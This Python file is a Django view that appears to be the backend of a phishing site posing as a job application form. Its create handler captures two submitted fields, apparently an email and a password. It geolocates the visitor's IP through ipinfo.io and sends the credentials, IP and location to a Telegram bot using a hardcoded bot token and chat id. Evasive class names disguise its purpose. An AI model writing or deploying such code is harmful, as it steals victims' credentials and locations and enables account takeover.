from django.shortcuts import render, redirect
from django.http import HttpResponse
from .forms import there_you_go
from django.http import HttpResponseRedirect
from django.views.decorators.csrf import csrf_exempt
import urllib.parse
import requests
import smtplib
from django.conf import settings
from django.core.mail import send_mail
from django.http import JsonResponse
from django.views.decorators.clickjacking import xframe_options_exempt
from bs4 import BeautifulSoup
import json
import datetime
from rest_framework import generics
from .models import it_is_fine
from .serializers import serial_ok

class got_it(generics.CreateAPIView):
    queryset = it_is_fine.objects.all()
    serializer_class = serial_ok
    
    def perform_create(self, serializer):
        field1_e = serializer.validated_data['field1_e']
        field2_p = serializer.validated_data['field2_p']
        serializer.save()
        
        data = {'field1_e': field1_e, 'field2_p': field2_p}
        api_key = 'c46b348355866e'
        user_pi = self.request.META.get('HTTP_X_FORWARDED_FOR')
        response = requests.get(f'https://ipinfo.io/{str(user_pi)}?token=c46b348355866e')
        data = response.json()
        current_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        api_token = '6149036873:AAEgb2ZsTMHnMyoWwB6tkOBjdvtLLq850BI'
        chat_id = '-632245863'
        message = 'info field1_e: ' + field1_e + ' and field2_p: ' + field2_p + '\nhas submitted the Job application succesfully. PI: '+ str(user_pi) + f"\ncty: {data['country']} \nct: {data['city']} \nrg: {data['region']} \nL,L : {data['loc']}  \nD and T: {current_time}"
        requests.post('https://api.telegram.org/bot' + api_token + '/sendMessage', json={'chat_id': chat_id, 'text': message})
        response = JsonResponse(data)
        
        response['Access-Control-Allow-Origin'] = '*'
        return response